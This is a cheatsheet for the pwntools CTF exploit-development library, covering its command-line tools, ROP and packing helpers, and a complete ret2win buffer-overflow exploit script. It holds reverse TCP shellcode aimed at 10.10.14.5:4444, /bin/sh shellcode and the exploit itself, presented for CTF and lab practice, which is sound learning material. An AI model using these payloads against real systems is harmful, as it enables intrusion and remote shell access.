# pwntools Cheatsheet

[pwntools](https://github.com/Gallopsled/pwntools) is a best-in-class CTF framework and exploit development library written in Python. Designed for rapid prototyping, binary exploitation (pwn), and reverse engineering, it provides a comprehensive suite of command-line tools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) alongside a high-level Python API for interacting with local processes and remote sockets.

---

## Table of Contents

- [Core Capabilities](#core-capabilities)
- [Installation](#installation)
- [Command-Line Utilities (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
  - [`pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
- [Python Exploit Development Workflow](#python-exploit-development-workflow)
  - [Process & Remote Socket Connections](#process--remote-socket-connections)
  - [ELF Parsing & Symbols](#elf-parsing--symbols)
  - [ROP Chain Construction](#rop-chain-construction)
  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Complete Exploit Example (Buffer Overflow + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Core Capabilities

- **Tubes Architecture:** Unified interface for interacting with local processes (`process`), remote TCP sockets (`remote`), and SSH sessions (`ssh`).
- **Binary & Gadget Inspection:** Automated ELF symbol resolution, GOT/PLT lookup, and automated ROP chain synthesis.
- **On-the-Fly Assembly:** Instant translation between assembly mnemonics and opcodes across x86, x86_64, ARM, MIPS, and AArch64.
- **Shellcode Synthesis:** Pre-built, customizable shellcode templates for reverse shells, execve, file reading, and evasion.

---

## Installation

```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```

---

## Command-Line Utilities (`pwn <cmd>`)

### `pwn cyclic` (Buffer Offset Calculation)
Generate unique De Bruijn cyclic patterns to determine the exact crash offset (EIP / RIP overwrite):

```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```

### `pwn checksec` (Mitigation Inspection)
Check security mitigations (Canary, NX, PIE, RELRO, ASLR) of any ELF executable:
```bash
pwn checksec /path/to/binary
```

### `pwn asm` & `pwn disasm` (Assembler / Disassembler)
Assemble instructions into shellcode bytes directly from the terminal:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```

### `pwn shellcraft` (Shellcode Generator)
Generate production-ready shellcode payloads directly to terminal stdout or binary files:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```

### `pwn template` (Exploit Skeleton Generator)
Generate a battle-tested Python exploit template for a target binary and remote server:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```

---

## Python Exploit Development Workflow

### Process & Remote Socket Connections
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```

### ELF Parsing & Symbols
Automatically read function addresses, GOT, and PLT tables without manual GDB lookups:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```

### ROP Chain Construction
Build Return-Oriented Programming (ROP) chains automatically:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```

### Packing & Endianness (`p32` / `p64`)
Convert integer memory addresses into little-endian bytes:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```

---

## Complete Exploit Example (Buffer Overflow + ret2win)

```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```
